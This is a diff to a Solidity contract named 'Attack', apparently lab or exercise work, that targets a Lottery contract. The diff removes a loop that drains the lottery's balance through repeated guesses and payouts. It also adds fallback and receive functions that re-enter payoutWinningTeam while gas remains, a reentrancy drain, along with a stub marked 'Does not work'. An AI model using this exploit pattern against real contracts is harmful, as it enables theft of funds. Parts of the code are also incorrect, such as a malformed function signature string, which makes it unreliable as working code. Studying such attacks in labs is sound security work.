@@ -11,7 +11,7 @@ contract Attack {
 
     Lottery public eg;
     Oracle public ek;
-    address private winner;
+    address public winner;
     uint counter;
 
     constructor(address _oracle, address _lottery) public {
@@ -31,22 +31,11 @@ contract Attack {
         eg.payoutWinningTeam(winner);
     }
 
-    function chainPayout() public {
-        uint256 temp = ek.getRandomNumber();
-        address temp2 = winner;
-        uint counter2;
-
-        for(counter2 = 0; address(eg).balance >= 2 ether; counter2++) {
-            eg.makeAGuess(temp2, temp);
-            eg.payoutWinningTeam(temp2);
+    // Does not work
+    function reentrancyAttack() public view {
+        if (gasleft() > 40_000){
+            //eg.payoutWinningTeam(getAddress());
         }
-        counter = counter2;
-    }
-
-    function reentrancyAttack() public {
-        (, bytes memory temp) = address(eg).call(abi.encodeWithSignature
-        ("payoutWinningTeam", winner));
-        eg.payoutWinningTeam(bytesToAddress(temp));
     }
 
     function bytesToAddress(bytes memory bys) private pure returns (address addr) {
@@ -55,10 +44,20 @@ contract Attack {
         } 
     }
 
-    fallback() external payable {
-        eg.payoutWinningTeam(winner);
+    function getAddress() public returns (bytes memory) {
+        (, bytes memory temp) = address(eg).call(abi.encodeWithSignature
+        ("payoutWinningTeam(address _team)", winner));
+        return temp;
     }
 
+    //called when call data is incorrect, when no function matches function in the bytes provided
+    fallback() external payable {
+        if(gasleft() > 40_000) {
+            eg.payoutWinningTeam(winner);
+        }
+    }
+
+    //called when empty call data is provided, which Lottery does
     receive() external payable {
         if(gasleft() > 40_000) {
             eg.payoutWinningTeam(winner);
